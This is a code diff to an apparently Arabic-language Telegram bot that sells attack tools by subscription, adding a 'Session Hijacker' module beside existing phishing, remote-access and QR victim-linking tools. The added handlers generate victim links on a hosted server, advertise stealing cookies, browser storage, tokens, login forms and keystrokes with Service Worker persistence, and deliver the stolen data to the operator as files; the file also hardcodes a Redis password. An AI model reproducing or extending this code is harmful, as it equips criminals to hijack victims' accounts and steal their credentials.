@@ -68,6 +68,27 @@ except Exception as e:
     lsh_bp = None
 
 # ============================================================
+# استيراد Session Hijacker Module (جديد)
+# ============================================================
+try:
+    from session_hijacker import (
+        init_session_hijacker_routes,
+        sh_bp,
+        get_sh_session_data,
+        sessions as sh_sessions,
+    )
+    SH_ENABLED = True
+    print("[+] session_hijacker imported")
+except Exception as e:
+    print(f"[-] Error importing session_hijacker: {e}")
+    SH_ENABLED = False
+
+    def init_session_hijacker_routes(app, bot): pass
+    sh_bp = None
+    def get_sh_session_data(sid): return None
+    sh_sessions = {}
+
+# ============================================================
 # استيراد نظام الدفع
 # ============================================================
 try:
@@ -102,7 +123,7 @@ except Exception as e:
     def send_invoice(*a, **kw): pass
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 1
-    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh"]
+    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
 
 
 # ============================================================
@@ -116,15 +137,12 @@ RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.a
 # ============================================================
 REDIS_URL = os.getenv("REDIS_URL", "").strip()
 
-# إذا لم يكن موجوداً، استخدم الافتراضي
 if not REDIS_URL:
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 
-# تنظيف الرابط
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
 
-# إضافة scheme إذا كان مفقوداً
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
     REDIS_URL = "redis://" + REDIS_URL
 
@@ -132,7 +150,6 @@ print(f"[+] Redis URL configured: {REDIS_URL[:45]}...")
 
 
 def _try_redis(url):
-    """محاولة اتصال Redis مع ping"""
     try:
         client = redis.Redis.from_url(
             url,
@@ -151,7 +168,6 @@ def _try_redis(url):
 
 redis_client = _try_redis(REDIS_URL)
 
-# إذا فشل، جرّب TLS
 if not redis_client and REDIS_URL.startswith("redis://"):
     tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
     print(f"[+] Trying TLS fallback...")
@@ -160,7 +176,6 @@ if not redis_client and REDIS_URL.startswith("redis://"):
         REDIS_URL = tls_url
         print("[+] TLS connection succeeded!")
 
-# إذا فشل، جرّب بدون TLS
 if not redis_client and REDIS_URL.startswith("rediss://"):
     non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
     print(f"[+] Trying non-TLS fallback...")
@@ -200,12 +215,15 @@ if qr_bp:
     app.register_blueprint(qr_bp)
 if LSH_ENABLED and lsh_bp:
     app.register_blueprint(lsh_bp)
+if SH_ENABLED and sh_bp:
+    app.register_blueprint(sh_bp)
 
 init_facebook_routes(app, bot)
 init_instagram_routes(app, bot)
 init_rat_routes(app, bot)
 init_qr_routes(app, bot)
 init_lsh_routes(app, bot)
+init_session_hijacker_routes(app, bot)
 
 if LSH_ENABLED:
     set_bot_reference(bot)
@@ -224,6 +242,7 @@ def main_menu():
     markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
     markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
     markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
+    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))  # ← جديد
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
     return markup
@@ -418,7 +437,6 @@ def callback_handler(call):
         consume_usage(chat_id, "lsh")
         bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")
 
-        # إنشاء الجلسة محلياً
         session_id = str(uuid.uuid4()).replace('-', '')[:24]
         if redis_client:
             try:
@@ -426,7 +444,6 @@ def callback_handler(call):
             except Exception as e:
                 print(f"[-] Redis setex LSH error: {e}")
 
-        # إعلام lsh_module (اختياري)
         try:
             requests.post(
                 f"{RAILWAY_URL}/lsh_create",
@@ -471,6 +488,56 @@ def callback_handler(call):
                 f"🕹️ **رابط الجلسة:**\n`{target_link}`",
                 parse_mode="Markdown"
             )
+        return
+
+    # ============================================================
+    # ★★★ توليد Session Hijacker (جديد) ★★★
+    # ============================================================
+    if call.data == "gen_sh":
+        check = can_use_tool(chat_id, "sh")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
+            return
+        consume_usage(chat_id, "sh")
+        bot.answer_callback_query(call.id, "جاري تجهيز جلسة سرقة الكوكيز...")
+
+        session_id = str(uuid.uuid4()).replace('-', '')[:24]
+        if redis_client:
+            try:
+                redis_client.setex(f"sh_session:{session_id}", 86400, str(chat_id))
+            except Exception as e:
+                print(f"[-] Redis setex SH error: {e}")
+
+        # إعلام session_hijacker (اختياري)
+        try:
+            requests.post(
+                f"{RAILWAY_URL}/sh_create",
+                json={"chat_id": chat_id, "session_id": session_id},
+                timeout=5
+            )
+        except Exception as e:
+            print(f"[-] SH create HTTP warning: {e}")
+
+        target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={chat_id}"
+        bot.send_message(
+            chat_id,
+            f"🍪 **أداة سرقة الجلسات والكوكيز**\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"🎯 **الرابط:**\n`{target_link}`\n\n"
+            f"📊 **ما تسحبه الأداة:**\n"
+            f"• 🍪 كل الكوكيز المتاحة (حتى المخفية)\n"
+            f"• 💾 LocalStorage + SessionStorage كامل\n"
+            f"• 📦 IndexedDB (فيسبوك، واتساب، تلجرام)\n"
+            f"• 🗄️ Cache Storage\n"
+            f"• 🔑 كل الـ Tokens (Bearer, XSRF, CSRF)\n"
+            f"• ⌨️ Keylogger حي\n"
+            f"• 📝 نماذج تسجيل الدخول\n"
+            f"• 🕵️ WebRTC IP Leak\n"
+            f"• 🖥️ بصمة الجهاز الكاملة\n\n"
+            f"⚠️ الأداة تبقى تعمل حتى بعد إغلاق الصفحة (Service Worker)",
+            parse_mode="Markdown"
+        )
         return
 
     # ============================================================
@@ -566,6 +633,51 @@ def callback_handler(call):
             bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
+    # ============================================================
+    # أوامر Session Hijacker (جديد)
+    # ============================================================
+    if call.data.startswith("sh_"):
+        parts = call.data.split("_", 2)
+        cmd = parts[1] if len(parts) > 1 else ""
+        sid = parts[2] if len(parts) > 2 else None
+
+        if cmd == "cookies":
+            sess = get_sh_session_data(sid)
+            if sess and sess.get('cookies'):
+                import json as _json
+                text = _json.dumps(sess['cookies'], ensure_ascii=False, indent=2)
+                buf = io.BytesIO(text.encode('utf-8'))
+                buf.name = f'cookies_{sid[:8]}.json'
+                bot.send_document(chat_id, buf, caption="🍪 الكوكيز")
+            else:
+                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
+        elif cmd == "storage":
+            sess = get_sh_session_data(sid)
+            if sess and sess.get('storage'):
+                import json as _json
+                text = _json.dumps(sess['storage'], ensure_ascii=False, indent=2)
+                buf = io.BytesIO(text.encode('utf-8'))
+                buf.name = f'storage_{sid[:8]}.json'
+                bot.send_document(chat_id, buf, caption="💾 Storage")
+            else:
+                bot.answer_callback_query(call.id, "لا يوجد Storage بعد", show_alert=True)
+        elif cmd == "tokens":
+            sess = get_sh_session_data(sid)
+            if sess and sess.get('forms'):
+                text = "\n".join(str(f) for f in sess['forms'])
+                buf = io.BytesIO(text.encode('utf-8'))
+                buf.name = f'tokens_{sid[:8]}.txt'
+                bot.send_document(chat_id, buf, caption="🔑 Tokens")
+            else:
+                bot.answer_callback_query(call.id, "لا توجد Tokens بعد", show_alert=True)
+        elif cmd == "html":
+            bot.answer_callback_query(call.id, "لا توجد HTML بعد", show_alert=True)
+        elif cmd == "open":
+            bot.answer_callback_query(call.id, "ميزة قيد التطوير")
+        elif cmd == "delete":
+            bot.answer_callback_query(call.id, "✅ تم")
+        return
+
 
 # ============================================================
 # معالجة الرابط المُدخل لفتحه على الضحية
@@ -585,7 +697,7 @@ def handle_open_url(message):
 
 
 # ============================================================
-# ★★★ تشغيل البوت — النسخة المُصلحة والمضمونة ★★★
+# ★★★ تشغيل البوت ★★★
 # ============================================================
 def run_telegram_bot():
     print("[+] ============================================")
@@ -593,7 +705,6 @@ def run_telegram_bot():
     print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
     print("[+] ============================================")
 
-    # 1) احذف الـ Webhook عبر HTTP مباشر (أسرع من telebot)
     try:
         r = requests.get(
             f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
@@ -604,7 +715,6 @@ def run_telegram_bot():
     except Exception as e:
         print(f"[-] deleteWebhook HTTP error: {e}")
 
-    # 2) تحقق من حالة Webhook
     try:
         r = requests.get(
             f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo",
@@ -614,7 +724,6 @@ def run_telegram_bot():
     except Exception as e:
         print(f"[-] getWebhookInfo error: {e}")
 
-    # 3) تحقق من getMe (البوت يعمل؟)
     try:
         r = requests.get(
             f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
@@ -624,7 +733,6 @@ def run_telegram_bot():
     except Exception as e:
         print(f"[-] getMe error: {e}")
 
-    # 4) ابدأ polling في حلقة لا نهائية
     print("[+] Starting infinity_polling loop...")
     attempt = 0
     while True:
@@ -644,11 +752,9 @@ def run_telegram_bot():
 
 
 if __name__ == "__main__":
-    # شغّل البوت في thread منفصل
     bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
     bot_thread.start()
 
-    # انتظر ثانيتين حتى يبدأ البوت
     time.sleep(2)
 
     port = int(os.environ.get("PORT", 8080))
